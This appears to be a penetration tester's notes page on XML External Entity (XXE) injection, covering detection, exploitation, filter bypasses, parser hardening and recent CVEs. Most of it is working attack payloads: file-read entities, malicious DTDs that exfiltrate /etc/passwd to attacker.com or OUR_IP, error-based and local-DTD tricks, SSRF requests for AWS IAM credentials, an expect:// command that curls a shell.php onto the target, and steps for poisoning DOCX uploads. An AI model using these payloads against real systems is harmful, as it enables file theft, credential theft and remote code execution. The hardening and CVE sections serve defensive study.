+++
title = 'XML External Entities (XXE)'
date = 2026-10-30
type = 'notes'
weight = 150
toc = true
tags = ['web', 'web-attacks', 'xxe', 'xml']
+++

An XML External Entity Injection (XXE) vulnerability occurs when an application parses attacker-supplied XML with **external entity processing enabled**. The parser resolves an attacker-defined entity that references a local file, an internal URL, or a remote DTD — turning the XML input into a **file-read, SSRF, or RCE primitive**.

> **2026 context:** XXE is no longer just a "SOAP endpoint" bug. It lives in **document-processing pipelines** (DOCX, XLSX, SVG, PDF/XFA), **SAML**, **XSLT transforms**, and **AI/LLM document loaders**. The scanner-bypass research of 2025–2026 shows that even applications that *do* implement a `DOCTYPE` filter can be bypassed through **encoding tricks** (PhpSpreadsheet's `XmlScanner`) and **parser-differential** behaviour.

The impact is determined by two factors: **whether the parser resolves external entities** and **which network/file boundary the resolved entity can cross**.

---

## 1. Resources and Tools

| Tool | What it does |
|---|---|
| [XXEinjector](https://github.com/enjoiz/XXEinjector) | Automated XXE exploitation via direct and OOB methods |
| [xxexploiter](https://github.com/luisfontes19/xxexploiter) | Payload generation and exploitation helper |
| [xxeserv](https://github.com/staaldraad/xxeserv) | Mini webserver with **FTP support** for OOB XXE payloads |
| [XXElixir](https://github.com/kljunowsky/XXElixir) | Poisons **XLSX** files for XXE testing |
| [XXERipper](https://pypi.org/project/xxeripper/) | **2026 scanner** — 30+ technique families, statistical baselining, differential parser fingerprinting across **11 XML stacks**, error-based + OOB detection, **WAF-bypass encoders (15, three families)**, end-to-end exploit-chain detection (XXE → IMDS → IAM credentials → AWS takeover), credential extraction, JSON/SARIF/HTML output |
| [web7-xxe-inject](https://github.com/5h4d0wn1k/web7-xxe-inject) | Payload generation, blind detection, error-based and OOB exfiltration |
| [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) | Embeds XXE payloads in Office/SVG files |
| [docem](https://github.com/whitel1st/docem) | Injects XXE payloads into DOCX/XLSX/ODT |
| [payloadbox XXE list](https://github.com/payloadbox/xxe-injection-payload-list) | Payload reference |
| **interactsh** / **Burp Collaborator** | OOB confirmation |
| **ffuf / ZAP / Burp Scanner** | Entry-point discovery and active scanning |

> **The 2026 tooling shift:** `XXERipper` performs **differential parser fingerprinting** — it sends paired test/control probes to determine which of the 11 XML stacks (libxml2, Xerces, .NET, Java SAX/StAX, Python stdlib, PHP DOM, Ruby, Node.js, Perl, Go) is parsing the input, and adapts the payload accordingly. This matters because the *same* payload behaves differently across parsers.

---

## 2. Types of XXE

| Type | Feedback channel | When to use |
|---|---|---|
| **Classic / in-band** | Response body | The entity value is reflected |
| **Blind OOB** | DNS or HTTP callback | No reflection, but egress is allowed |
| **Error-based** | Parser error message | No reflection and **no egress** |
| **SSRF via XXE** | Internal service response | The entity URL points at an internal host |
| **XXE → RCE** | Command output | `expect://`, or a document processor that executes |

> **Error-based and local-DTD repurposing are the two techniques most often omitted from notes** — and they are the only paths when outbound traffic is blocked.

---

## 3. Basic Payloads

**Define an external entity to a URL:**

```xml
<!ENTITY xxe SYSTEM "http://example.com">
```

**Local file disclosure:**

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

**Base64-encode the file to survive XML special characters (PHP filter):**

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&xxe;</data>
```

**Read a directory (Java):**

```xml
<!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]>
<root><foo>&xxe;</foo></root>
```

**OOB exfiltration entity (parameter entity):**

```xml
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

> **Why base64 matters:** `/etc/passwd` contains newlines and `&` characters that break XML parsing when reflected directly. The `php://filter` wrapper (or `expect://` alternatives) returns a single-line base64 blob.

---

## 4. Identifying XXE Candidates

**Step 1 — Find XML entry points.** Look for:

- `Content-Type: application/xml` or `text/xml`
- XML-structured bodies (`<?xml`, `<root>`, SOAP envelopes, SAML assertions)
- **File upload** endpoints accepting **SVG, DOCX, XLSX, PPTX, ODT, PDF/XFA, RSS/Atom, plist**
- **JSON endpoints** — try switching `Content-Type` to `application/xml`; many frameworks accept both, and a JSON-only validator does not apply to XML
- **XSLT** transform features, **report generators**, **document converters**

**Step 2 — Inject an external entity.** Insert the DTD **after** the XML prolog:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe "my entity value"> ]>
```

**Step 3 — Reference the entity** inside any element:

```xml
<VulnerableTag>&xxe;</VulnerableTag>
```

**Step 4 — Case 1: the value is reflected.** If `my entity value` appears in the response, the parser resolves entities — proceed to file read.

**Step 5 — Case 2: no reflection (blind).** The absence of a reflection does **not** rule out entity processing. Move to OOB, error-based, or local-DTD techniques.

> **The most common false negative:** a scanner reports "XXE" because its marker string was echoed, not because the entity resolved. Always reproduce with a real `SYSTEM "file:///..."` entity.

---

## 5. In-Band File Disclosure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>
```

If the file contains characters that break XML (`<`, `&`, newlines), use the base64 filter from §3, or switch to the CDATA technique in §7.

---

## 6. Blind XXE — OOB with an External DTD

When the entity is processed but not reflected, host a **malicious DTD** on your server and reference it from the injected XML. The parser fetches the DTD and executes its declarations, sending the file contents to your listener.

**`malicious.dtd`:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**Injected XML:**

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]>
```

**How the DTD works:**

1. `file` holds the contents of `/etc/passwd`.
2. `eval` dynamically declares a new parameter entity, `exfiltrate`, whose value is a URL containing `%file;`.
3. `%eval;` performs the dynamic declaration.
4. `%exfiltrate;` causes the HTTP request that carries the data.

> **Limitation:** if `/etc/passwd` contains newlines, the URL breaks and the exfiltration fails. The **base64 + PHP filter** variant fixes this — but only when the target is PHP. For non-PHP targets, use the **error-based** (§9) or **local-DTD** (§10) techniques.

**Base64 variant of `malicious.dtd`:**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

---

## 7. OOB Exfiltration via CDATA

CDATA allows the file contents to be embedded literally — including newlines and special characters — and then exfiltrated as a single string. This is the standard fix for the newline problem in §6.

**Injected XML:**

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
```

**`xxe.dtd` on your server:**

```xml
<!ENTITY joined "%begin;%file;%end;">
```

**Reference the general entity in a reflected tag:**

```xml
<root>&joined;</root>
```

> **Common mistake:** use `&joined;` — **not** `&xxe;`. `xxe` is the **parameter** entity that loads the remote DTD and is not available as a general entity in the document body. `joined` is the general entity the DTD defines.

---

## 8. Error-Based XXE (No Egress Required)

When outbound traffic is blocked **and** the response is not reflected, the parser's **error message** can be used as the exfiltration channel. The trick is to reference a **non-existent file whose name contains the target file's contents** — the parser then includes that name in the error.

**`malicious.dtd`:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Injected XML:**

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]>
```

The parser attempts to open `file:///nonexistent/root:x:0:0:...` and returns an error such as:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash...
```

> **Why this is the most under-used technique:** it requires **no outbound connectivity** — only that the error is visible (directly, in a log the attacker can read, or via a reflected error page). It is the fallback when OOB is filtered.

---

## 9. Local DTD Repurposing (No External Server)

When **all external DTD loading is blocked** but the server has a **local DTD** on disk, you can reference that DTD and **redefine one of its entities** to trigger an error that contains your file contents.

**The technique:**

1. Find a DTD that already exists on the target (e.g. `/usr/share/yelp/dtd/docbookx.dtd` on GNOME systems, or a Java `properties.dtd`).
2. Reference it with `SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"`.
3. Redeclare one of its entities to wrap `%file;` in a failing URL.

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
  '>
  %local_dtd;
]>
```

**Common local DTDs to try:**

| OS / stack | DTD path |
|---|---|
| GNOME / Yelp | `/usr/share/yelp/dtd/docbookx.dtd` |
| Java | `file:///usr/share/java/...` (varies) |
| Windows | `C:\Windows\System32\...` (rarely useful) |

> **Why this bypasses the filter:** the parser is loading a **legitimate local file**, not a remote DTD. The filter that blocks `http://` DTD loading does not block `file://` references to system DTDs — and the redefinition executes inside that trusted DTD's context.

---

## 10. XInclude (When DOCTYPE Is Blocked)

If the application **strips `<!DOCTYPE>`** but still parses XML, XInclude is an alternative injection primitive. It is a separate XML feature that includes external resources **without a DTD**.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

> **Precondition:** the parser must have XInclude processing enabled (`setXIncludeAware(true)` in Java, or the equivalent). Many hardened parsers disable it alongside DTDs — check with a probe.

---

## 11. XXE to SSRF — Cloud Metadata

An XXE with an `http://` or `https://` `SYSTEM` identifier is **functionally an SSRF primitive**. The parser makes the request, and the response is returned as the entity value.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Cloud metadata endpoints:**

| Provider | Endpoint | Header requirement |
|---|---|---|
| **AWS IMDSv1** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | None |
| **AWS IMDSv2** | `PUT /latest/api/token` first | `X-aws-ec2-metadata-token-ttl-seconds` |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/...` | `Metadata-Flavor: Google` |
| **Azure** | `http://169.254.169.254/metadata/identity/oauth2/token` | `Metadata: true` |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1/` | None |
| **Alibaba** | `http://100.100.100.200/latest/meta-data/` | None |

> **The header problem:** GCP and Azure require a custom header, which most XXE primitives cannot set. **IMDSv1 is the reliable target**; IMDSv2 is exploitable only when the XML parser forwards method and headers (rare). If IMDSv1 is disabled — as it has been by default on new EC2 instance types since mid-2024, and account-wide since March 2024 — the SSRF may reach the metadata IP but return only a token challenge.

---

## 12. XXE to RCE

### 12.1 PHP `expect://` wrapper

If the `expect` extension is loaded (rare, but present on some default PHP installs), the parser can execute a command:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<email>&xxe;</email>
```

`$IFS` substitutes for spaces to bypass space filtering.

> **Precondition:** `extension=expect` in `php.ini`. It is **not** installed by default on most modern PHP builds — check with `php -m | grep expect`.

### 12.2 Document processor → RCE

The more common 2026 path is **XXE in a document processor that has its own RCE surface**. An XXE in an XSLT engine can reach `document()` and read files; an XXE in a PDF/XFA parser can reach JavaScript; an XXE in a template engine can reach expression evaluation.

**CVE-2025-6985 (langchain-text-splitters)** is the representative case: `HTMLSectionSplitter` parses custom XSLT with `lxml.etree.XSLT()` without hardening. On lxml 4.x, external entities are resolved by default; on lxml 5.0+, entity expansion is disabled but the **XSLT `document()` function** still reads any URI — so the XXE survives the upgrade.

---

## 13. XXE via File Upload (SVG / DOCX / XLSX)

The parser is often reached through a **file upload** rather than a raw XML body. Cell-level input validation on a form does not protect the server-side document parser.

### 13.1 SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

If the server renders or converts the SVG (Batik, ImageMagick, a PDF generator), the entity resolves.

### 13.2 DOCX / XLSX

Office files are **ZIP archives containing XML**. Unzip, inject a `DOCTYPE` into one of the XML parts, rezip, and upload.

```bash
mkdir xxe_docx && cd xxe_docx
unzip ../target.docx
# Inject into word/document.xml (DOCX) or xl/workbook.xml (XLSX)
# Add after the XML prolog:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then wrap a cell/paragraph value with &xxe;
zip -r ../malicious.docx .
```

**CVE-2025-66516 (Apache Tika, CVSS 10.0)** is the canonical example: a crafted **XFA file inside a PDF** triggers XXE in `tika-core` 1.13–3.2.1. The PDF parser is the entry point, but the vulnerable parser is the core XML handler — so upgrading the PDF module alone is insufficient.

**PhpSpreadsheet (CVE-2026-108357 / CVE-2026-108358)** shows the scanner-bypass layer: `XmlScanner::scan()` builds a regex that only accounts for **NULL-byte interleaving** in `<!DOCTYPE`. Two bypasses:

- **Double-encoded `unentity()` TOCTOU** — the scanner's `html_entity_decode()` callback runs **after** the pattern check, so double-encoding `<` as `&#60;` produces a valid `<!DOCTYPE` on the second pass that neither scan detected.
- **ISO-2022 escape sequences** — inserting `0x1B` bytes between the characters of `<!DOCTYPE` breaks the regex; the XML parser strips the ESC bytes during charset normalization and produces a valid declaration. **Seven ISO-2022 variants** bypass the scanner.

Any application using PhpSpreadsheet to process user-uploaded XLSX files is affected. Internal entity expansion still works for **DoS** on all PHP versions; XXE/SSRF requires PHP < 8.0 or `LIBXML_NOENT`.

---

## 14. WAF and Filter Bypass (2025–2026)

### 14.1 Content-Type confusion

A WAF that inspects `application/json` may not inspect `application/xml`. If the endpoint accepts both, switch the `Content-Type` and send XML:

```http
POST /api/login HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><user>&xxe;</user></root>
```

This is the **JSON-to-XML bypass**: the JSON validator passes the request through because it never sees JSON, and the XML parser accepts the body.

### 14.2 Encoding-based bypasses

| Encoding | Purpose |
|---|---|
| **UTF-16 / UTF-32** | The WAF's regex may not match UTF-16 encoded `<!DOCTYPE` |
| **ISO-2022 escape sequences** | Break the `<!DOCTYPE` pattern; parser strips ESC bytes (CVE-2026-108358) |
| **Double HTML-entity encoding** | The scanner decodes once; the parser decodes again (CVE-2026-108357) |
| **UTF-7** | `+ADw-` for `<` — some parsers accept it |

```bash
# Convert a payload to UTF-16
iconv -f UTF-8 -t UTF-16 payload.xml > payload_utf16.xml
```

### 14.3 WAF-bypass phase in XXERipper

XXERipper's `--bypass-waf` re-sends the entire payload catalogue through **15 encoders across three families**, after the core phases complete — so a direct hit is found in ~20 requests rather than being buried behind ~1,500 encoded ones.

### 14.4 GeoServer CVE-2025-58360

An unauthenticated XXE via the **WMS GetMap** operation. The published bypass demonstrates that WAFs intercepting the standard `GetMap` request can be bypassed by manipulating the XML payload's structure — relevant because many organisations cannot patch GeoServer and rely on the WAF alone.

---

## 15. Parser-Specific Behaviour and Hardening

The **same payload** behaves differently across parsers. This is why differential fingerprinting (XXERipper's approach) matters.

| Parser | Default behaviour | Hardening |
|---|---|---|
| **libxml2 (PHP)** | External entities **disabled since PHP 8.0**; `LIBXML_NOENT` re-enables | Avoid `LIBXML_NOENT`; `libxml_disable_entity_loader(true)` on older PHP |
| **Java `DocumentBuilderFactory`** | Entities **enabled** by default | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` |
| **Java `SAXParserFactory`** | Entities enabled | Same `disallow-doctype-decl` feature |
| **Java `XMLInputFactory`** | Entities enabled | `setProperty(XMLInputFactory.SUPPORT_DTD, false)` |
| **.NET `XmlReader`** | DTD processing **prohibited** by default since .NET 4.5.2 | `DtdProcessing = DtdProcessing.Prohibit` |
| **Python `xml.sax`** | Entities **enabled** | Use `defusedxml` |
| **Python `lxml`** | Entities **disabled in 5.0+**; XSLT `document()` still reads URIs | `resolve_entities=False`, but XSLT needs separate hardening |
| **Ruby Nokogiri** | Entities disabled by default in recent versions | Explicit `NOENT` removal |

> **The durable fix is `disallow-doctype-decl`** — if the application never needs a `DOCTYPE`, refuse it outright. The OWASP XXE Prevention Cheat Sheet has said this for years; the 2025–2026 CVEs are all cases where the developer implemented a **partial** fix (a regex scanner, a blocklist, a single parser config) that a different code path bypassed.

---

## 16. Real-World XXE CVEs (2025–2026)

| CVE / Advisory | Product | Primitive |
|---|---|---|
| **CVE-2025-66516** | Apache Tika (`tika-core`, `tika-pdf-module`, `tika-parsers`) | **CVSS 10.0** — XFA file inside a PDF → XXE; `tika-core` is the vulnerable component, so upgrading the PDF module alone does not fix it |
| **CVE-2025-54988** | Apache Tika | Earlier XXE (CVSS 8.4); CVE-2025-66516 expands the affected packages |
| **CVE-2025-68493 (S2-069)** | Apache Struts 2 | XWork component parses XML without validation → XXE, SSRF, DoS |
| **CVE-2026-44618** | Apache CXF WS-Transfer | Insecure parser configuration → XXE |
| **CVE-2026-44020** | Docling (USPTO patent parsers) | `xml.sax.parseString()` without protection → file read, SSRF, Billion Laughs |
| **CVE-2026-31247** | Docling (JATS backend) | Entity expansion → XXE through 2.61.0 |
| **CVE-2026-108357** | PhpSpreadsheet | Double-encoded `unentity()` TOCTOU → XXE/SSRF, DoS |
| **CVE-2026-108358** | PhpSpreadsheet | ISO-2022 escape sequences bypass `XmlScanner` → XXE/SSRF, DoS |
| **CVE-2025-6985** | langchain-text-splitters | `HTMLSectionSplitter` XSLT without hardening → file read; `document()` survives lxml 5.0+ |
| **CVE-2025-58360** | GeoServer | Unauthenticated XXE via WMS GetMap; WAF bypass published |
| **GHSA-4G2H-VM7X-747C** | esaml (and forks) | SAML parsed before signature verification → XXE; Erlang/OTP < 27 Xmerl allows entity expansion |
| **GHSA-2MPF-M756-HXJM** | Spring `Jaxp13XPathTemplate` | XPath over `StreamSource`/`SAXSource` uses the JDK default parser instead of Spring's hardened config |
| **CVE-2025-9316 / CVE-2025-11700** | N-able N-Central | Unauthenticated session bypass + XXE |
| **CVE-2026-48153** | Budibase | SSRF via OAuth2 token endpoint reaches internal hosts and cloud metadata; XML processing may be XXE-vulnerable |

> **The pattern across every 2025–2026 case:** the application has **some** XML defence — a scanner, a single hardened parser, a module-level upgrade — and the vulnerability exists because a **different code path** or a **different encoding** reaches the parser without it.

---

## 17. Testing Methodology

```bash
# 1. Identify XML entry points
#    Content-Type: application/xml / text/xml
#    File uploads: SVG, DOCX, XLSX, PPTX, PDF/XFA, plist, RSS
#    SAML, SOAP, XSLT, JSON endpoints that accept XML

# 2. Probe for entity resolution
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "test123">]><root>&xxe;</root>

# 3. In-band file read
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# or base64:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>

# 4. If blind, start an OOB listener and host a DTD
interactsh-client
python3 -m http.server 8000          # serve malicious.dtd

# 5. If OOB is blocked, use error-based
#    malicious.dtd with file:///nonexistent/%file;

# 6. If external DTD loading is blocked, use a local DTD
#    file:///usr/share/yelp/dtd/docbookx.dtd + entity redefinition

# 7. If DOCTYPE is stripped, use XInclude
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

# 8. If the parser reaches the network, target cloud metadata
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

# 9. If file upload is the vector, embed the DTD in SVG/DOCX/XLSX

# 10. If a WAF blocks the payload, try Content-Type confusion and encoding bypasses
```

---

## 18. Field Notes

- **In-band XXE is the easy case; the real work is the four blind variants.** OOB, error-based, local-DTD, and XInclude cover every filter combination — and error-based + local-DTD are the only paths when egress is blocked.
- **The newline problem breaks naive OOB.** `/etc/passwd` contains newlines; the URL-query exfiltration fails. Use base64 (PHP), CDATA (§7), or error-based (§8).
- **`&joined;` not `&xxe;`.** In the CDATA technique, `xxe` is the parameter entity that loads the DTD; `joined` is the general entity you reference in the document.
- **Local DTD repurposing needs no external server.** It is the correct technique when the target has no egress and you cannot host a DTD.
- **XInclude survives `DOCTYPE` stripping.** If the filter removes `<!DOCTYPE>` but leaves the parser intact, `xi:include` is still available.
- **File uploads are the modern entry point.** SVG, DOCX, XLSX, and PDF/XFA all carry XML to a server-side parser — cell-level validation on the form does nothing.
- **Scanner bypasses are the 2026 story.** PhpSpreadsheet's `XmlScanner` was defeated by double-encoding and ISO-2022 escapes; the fix is `disallow-doctype-decl`, not a better regex.
- **IMDSv1 is the cloud payoff.** XXE → `169.254.169.254` → IAM credentials → account takeover. IMDSv2 is only reachable if the parser forwards `PUT` and headers.
- **Check the parser, not the banner.** `XXERipper`'s differential fingerprinting exists because the same payload works on libxml2 and fails on .NET — identify the stack before choosing the payload.
- **`expect://` is rare; document-processor RCE is common.** Most XXE-to-RCE in 2026 goes through a downstream document converter, not the `expect` wrapper.

---

This file sits alongside the **SSRF** and **File Upload** notes: XXE is the XML-layer primitive, SSRF is its network-layer consequence, and file upload is the delivery mechanism that reaches the parser when the application never exposes a raw XML endpoint.
